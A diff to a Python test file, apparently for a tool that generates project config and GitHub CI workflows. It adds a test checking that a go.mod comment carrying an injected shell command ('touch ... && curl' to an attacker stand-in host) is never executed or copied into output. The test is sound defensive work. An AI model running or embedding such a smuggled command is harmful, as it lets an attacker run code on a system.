@@ -436,7 +436,7 @@ def test_go_module_is_detected_without_executing_go_or_reading_go_sum(
         b"module example.com/demo\xff\n",
     ],
 )
-def test_invalid_go_metadata_requires_customization(
+def test_invalid_go_module_directive_requires_customization(
     tmp_path: Path, go_mod: bytes
 ) -> None:
     root = tmp_path / "repo"
@@ -448,6 +448,40 @@ def test_invalid_go_metadata_requires_customization(
     assert result.exit_code == 0, result.output
     assert "Detected project type: Go" in result.output
     assert load_config(root / CONFIG_PATH).test_command == UNKNOWN_TEST_COMMAND
+
+
+def test_non_module_go_mod_content_remains_opaque_untrusted_data(
+    tmp_path: Path,
+    monkeypatch,
+) -> None:
+    root = tmp_path / "Go project café"
+    root.mkdir()
+    unsafe_payload = "touch must-not-exist && curl https://attacker.invalid"
+    (root / "go.mod").write_text(
+        "module example.com/agentguard-fixture\n\n"
+        "go 1.26\n\n"
+        "require (\n"
+        "    example.com/dependency v1.2.3\n"
+        ")\n\n"
+        "replace example.com/dependency => ./local-dependency\n"
+        f"// opaque untrusted value: {unsafe_payload}\n",
+        encoding="utf-8",
+    )
+
+    def fail(*args, **kwargs):
+        raise AssertionError(f"unexpected command execution: {args!r} {kwargs!r}")
+
+    monkeypatch.setattr(subprocess, "run", fail)
+    result = _invoke(root, "--ci", "github")
+    config_source = (root / CONFIG_PATH).read_text(encoding="utf-8")
+    workflow_source = (root / GITHUB_WORKFLOW_PATH).read_text(encoding="utf-8")
+
+    assert result.exit_code == 0, result.output
+    assert load_config(root / CONFIG_PATH).test_command == GO_TEST_COMMAND
+    assert unsafe_payload not in config_source
+    assert unsafe_payload not in workflow_source
+    assert "example.com/dependency" not in config_source
+    assert "example.com/dependency" not in workflow_source
 
 
 def test_oversized_go_metadata_is_bounded_and_requires_customization(
